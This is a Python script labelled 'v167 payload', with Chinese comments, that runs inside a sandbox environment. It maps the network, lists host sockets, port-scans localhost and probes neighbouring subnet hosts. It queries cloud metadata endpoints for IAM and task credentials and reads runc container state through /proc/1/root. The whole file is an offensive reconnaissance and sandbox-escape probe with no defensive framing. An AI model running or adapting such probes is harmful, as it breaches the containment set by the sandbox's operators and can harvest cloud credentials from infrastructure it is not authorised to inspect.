# -*- coding: utf-8 -*-
"""v167 payload: 沙箱直连 cell VM 网络探测 + runc state.json 容器 config
输出 /vercel/sandbox/v167c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess

OUT = '/vercel/sandbox/v167c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=10):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return r.stdout.decode(errors='replace')[:3000] + r.stderr.decode(errors='replace')[:1000]
    except Exception as e:
        return 'EXC %s' % e


# ============ 1: 网络拓扑 ============
log('=== 1 topo ===')
log('IP: %s' % sh('ip addr 2>&1').strip())
log('ROUTE: %s' % sh('ip route 2>&1').strip())
log('ARP: %s' % sh('ip neigh 2>&1').strip())

# ============ 2: host 监听端口 (tcp/udp) ============
log('=== 2 listen ===')
log('TCP: %s' % sh('cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | grep -v "st 00000000" | head -40').strip())
log('UDP: %s' % sh('cat /proc/net/udp 2>/dev/null | head -20').strip())
log('VSOCK: %s' % sh('cat /proc/net/vsock 2>/dev/null | head -30').strip())

# ============ 3: host unix sockets ============
log('=== 3 unix ===')
log('UNIX: %s' % sh('cat /proc/net/unix | grep -v "^Num" | grep "/" | head -40').strip())

# ============ 4: 127.0.0.1 端口扫描 ============
log('=== 4 portscan ===')
for p in range(1, 1025):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.15)
        if s.connect_ex(('127.0.0.1', p)) == 0:
            log('OPEN 127.0.0.1:%d' % p)
        s.close()
    except Exception:
        pass
log('scan done')

# ============ 5: metadata + 特殊地址 ============
log('=== 5 meta ===')
log('META: %s' % sh('curl -s -m 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -20').strip())
log('META-IAM: %s' % sh('curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -5').strip())
log('GW: %s' % sh('curl -s -m 4 http://$(ip route | awk \'/default/ {print $3}\')/ 2>&1 | head -5').strip())
log('IMDS2: %s' % sh('curl -s -m 4 -H "X-aws-ec2-metadata-token-ttl-seconds: 60" -X PUT http://169.254.169.254/latest/api/token 2>&1 | head -5').strip())
log('TASKMETA: %s' % sh('curl -s -m 4 http://169.254.170.2/v2/credentials 2>&1 | head -5').strip())

# ============ 6: 网关 IP / 邻居探测 ============
log('=== 6 gw ===')
log('GWMETA: %s' % sh('curl -s -m 3 http://169.254.169.254:80/ 2>&1 | head -3').strip())
# 邻居网段探测 (网关同网段其他 IP)
gw = sh('ip route | awk \'/default/ {print $3}\'').strip()
if gw:
    base = '.'.join(gw.split('.')[:3])
    log('neigh scan %s.0/24' % base)
    out = []
    for i in range(1, 15):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            ip = '%s.%d' % (base, i)
            if s.connect_ex((ip, 22)) == 0 or s.connect_ex((ip, 80)) == 0 or s.connect_ex((ip, 443)) == 0:
                out.append(ip)
            s.close()
        except Exception:
            pass
    log('neigh open: %s' % out)

# ============ 7: runc state.json (容器 config) ============
log('=== 7 runc state ===')
for base in ['/run/runc', '/run/cell/runc', R + '/run/runc', R + '/run/cell/runc']:
    try:
        for e in sorted(os.listdir(base)):
            sp = os.path.join(base, e, 'state.json')
            if os.path.exists(sp):
                d = open(sp).read()
                log('STATE %s len=%d' % (sp, len(d)))
                log('STATE %s' % d[:2500])
            else:
                log('DIR %s/%s (no state.json)' % (base, e))
    except Exception as e:
        log('RUNC %s EXC %s' % (base, e))

log('V167_DONE')
f.close()
